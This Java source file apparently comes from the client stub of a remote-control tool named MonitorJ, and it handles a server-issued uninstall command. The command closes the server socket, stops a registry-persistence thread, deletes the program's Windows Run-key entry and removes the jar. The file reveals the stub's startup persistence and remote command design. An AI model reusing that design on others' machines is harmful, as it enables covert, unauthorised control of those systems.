package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.MonitorJStub;
import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
import me.jershdervis.monitorj.stub.util.WinRegistry;
import cn.a114.utils.ClientPrinter;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.URISyntaxException;

/**
 * Created by Josh on 21/06/2015.
 */
public class UninstallClientApplicationTask extends PacketTask {

    public UninstallClientApplicationTask() {
        super(Packets.UNINSTALL_CLIENT_APPLICATION.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        //Close connection to server
        client.getServerSocketConnection().close();
        //Stop registry persistence
        MonitorJStub.getInstance().getRegPersistThread().interrupt();
        //Remove registry startup key
        try {
            WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    MonitorJStub.getInstance().getRegKey(),
                    WinRegistry.KEY_WOW64_32KEY);

            ClientSystemUtil.getCurrentRunningJar().deleteOnExit(); //Fix
        } catch (IllegalAccessException |InvocationTargetException |URISyntaxException e){
            ClientPrinter.out(e.getStackTrace());
        }

        System.exit(0);
    }
}
